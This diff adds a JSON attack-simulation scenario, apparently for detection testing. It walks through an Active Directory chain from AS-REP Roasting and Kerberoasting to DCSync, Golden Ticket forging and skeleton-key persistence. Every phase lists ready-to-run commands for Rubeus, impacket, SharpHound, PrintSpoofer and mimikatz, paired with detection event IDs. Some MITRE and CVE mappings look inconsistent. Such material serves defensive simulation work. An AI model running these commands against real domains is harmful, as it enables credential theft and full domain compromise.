@@ -1,0 +1,160 @@
+{
+  "id": "sc-kerberoasting-001",
+  "name": "Active Directory Attack Chain: Kerberoasting to Domain Takeover",
+  "description": "A stealthy Active Directory attack chain modeled on real APT tradecraft: initial foothold via phishing, AS-REP Roasting for pre-auth disabled accounts, Kerberoasting to obtain service account TGS tickets, offline password cracking, Golden Ticket forging with stolen KRBTGT hash, and full domain persistence via DCSync and skeleton key injection.",
+  "severity": "critical",
+  "category": "active_directory",
+  "threat_actor": {
+    "name": "APT41 (Double Dragon)",
+    "aliases": ["Winnti", "Barium", "Bronze Atlas"],
+    "origin": "China",
+    "motivation": "Espionage + Financial crime",
+    "active_since": "2012"
+  },
+  "mitre_techniques_summary": [
+    "T1566.001", "T1558.004", "T1558.003", "T1558.001",
+    "T1003.006", "T1098.002", "T1207", "T1087.002"
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1558/003/",
+    "https://adsecurity.org/?p=2293",
+    "https://www.crowdstrike.com/blog/how-to-stop-the-kerberoasting-attack/"
+  ],
+  "kill_chain": ["initial_access", "discovery", "credential_access", "privilege_escalation", "persistence"],
+  "phases": [
+    {
+      "phase": 1,
+      "name": "AS-REP Roasting — Pre-Authentication Disabled Accounts",
+      "description": "Attacker enumerates accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag). AS-REP responses are captured and the encrypted portion is extracted for offline cracking without requiring domain credentials.",
+      "technique_id": "T1558.004",
+      "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
+      "tactic": "Credential Access",
+      "target_host": "ws-it-01",
+      "target_user": "svc.backup",
+      "delay_seconds": 0,
+      "stealth_level": "high",
+      "indicators": {
+        "commands": [
+          "GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt",
+          "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
+          "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+        ],
+        "source_ip": "10.0.1.100"
+      },
+      "ioc": {
+        "tools": ["Rubeus", "GetNPUsers.py", "impacket"],
+        "events": ["EventID 4768 with RC4 encryption from unusual host"]
+      }
+    },
+    {
+      "phase": 2,
+      "name": "Active Directory Enumeration — BloodHound/SharpHound",
+      "description": "SharpHound collector runs LDAP queries to build a complete AD graph. BloodHound analysis reveals attack paths to Domain Admins through Kerberoastable service accounts and ACL abuses.",
+      "technique_id": "T1087.002",
+      "technique_name": "Account Discovery: Domain Account",
+      "tactic": "Discovery",
+      "target_host": "ws-it-01",
+      "target_user": "jdupont",
+      "delay_seconds": 120,
+      "stealth_level": "medium",
+      "indicators": {
+        "commands": [
+          "SharpHound.exe -c All --zipfilename bloodhound_data.zip",
+          "Invoke-BloodHound -CollectionMethod All",
+          "Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -ne $null}",
+          "nltest /domain_trusts",
+          "net group 'Domain Admins' /domain"
+        ]
+      },
+      "ioc": {
+        "tools": ["BloodHound", "SharpHound", "ldapdomaindump"]
+      }
+    },
+    {
+      "phase": 3,
+      "name": "Kerberoasting — SPN Ticket Request",
+      "description": "Using a low-privileged domain account, the attacker requests TGS tickets for all accounts with Service Principal Names (SPNs). The tickets are extracted and sent offline for cracking against weak service account passwords.",
+      "technique_id": "T1558.003",
+      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+      "tactic": "Credential Access",
+      "target_host": "ws-it-01",
+      "target_user": "jdupont",
+      "delay_seconds": 300,
+      "stealth_level": "high",
+      "indicators": {
+        "commands": [
+          "Rubeus.exe kerberoast /outputfile:kerberoast_hashes.txt /format:hashcat",
+          "GetUserSPNs.py corp.local/jdupont:Password123 -request -outputfile kerberoast.txt",
+          "Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt"
+        ],
+        "targeted_spns": ["MSSQLSvc/srv-db-01:1433", "HTTP/srv-web-01:80", "CIFS/srv-file-01"]
+      },
+      "ioc": {
+        "tools": ["Rubeus", "GetUserSPNs.py"],
+        "events": ["EventID 4769 with RC4 (0x17) encryption type from non-DC host"]
+      }
+    },
+    {
+      "phase": 4,
+      "name": "Privilege Escalation via Cracked Service Account",
+      "description": "The SQL service account password (cracked offline via hashcat) grants local admin on srv-db-01. Combined with SeImpersonatePrivilege, the attacker escalates to SYSTEM using PrintSpoofer.",
+      "technique_id": "T1548",
+      "technique_name": "Abuse Elevation Control Mechanism",
+      "tactic": "Privilege Escalation",
+      "target_host": "srv-db-01",
+      "target_user": "svc.sql",
+      "delay_seconds": 600,
+      "stealth_level": "medium",
+      "indicators": {
+        "commands": [
+          "PrintSpoofer64.exe -i -c cmd.exe",
+          "JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe"
+        ]
+      },
+      "ioc": {
+        "tools": ["PrintSpoofer", "JuicyPotatoNG", "hashcat"],
+        "cve": ["CVE-2020-1048"]
+      }
+    },
+    {
+      "phase": 5,
+      "name": "DCSync — KRBTGT Hash Extraction",
+      "description": "With Domain Admin equivalent rights, the attacker performs DCSync to replicate the KRBTGT account hash. This enables forging Golden Tickets for unlimited domain persistence.",
+      "technique_id": "T1003.006",
+      "technique_name": "OS Credential Dumping: DCSync",
+      "tactic": "Credential Access",
+      "target_host": "srv-dc-01",
+      "target_user": "svc.sql",
+      "delay_seconds": 300,
+      "stealth_level": "medium",
+      "indicators": {
+        "commands": [
+          "mimikatz.exe lsadump::dcsync /domain:corp.local /user:krbtgt",
+          "secretsdump.py -just-dc corp.local/svc.sql@10.0.1.2"
+        ]
+      }
+    },
+    {
+      "phase": 6,
+      "name": "Golden Ticket Forging and Domain Persistence",
+      "description": "Using the KRBTGT hash, the attacker forges a Golden Ticket with a 10-year validity, granting any user domain admin access on any service. Skeleton key is also injected into the DC for backdoor access.",
+      "technique_id": "T1558.001",
+      "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
+      "tactic": "Privilege Escalation",
+      "target_host": "srv-dc-01",
+      "target_user": "administrator",
+      "delay_seconds": 180,
+      "stealth_level": "very_high",
+      "indicators": {
+        "commands": [
+          "mimikatz.exe kerberos::golden /user:backdoor /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi",
+          "mimikatz.exe misc::skeleton",
+          "kerberos::ptt golden.kirbi"
+        ]
+      },
+      "ioc": {
+        "events": ["EventID 4624 Logon Type 3 with unusual SID", "EventID 4672 with special privileges"]
+      }
+    }
+  ]
+}
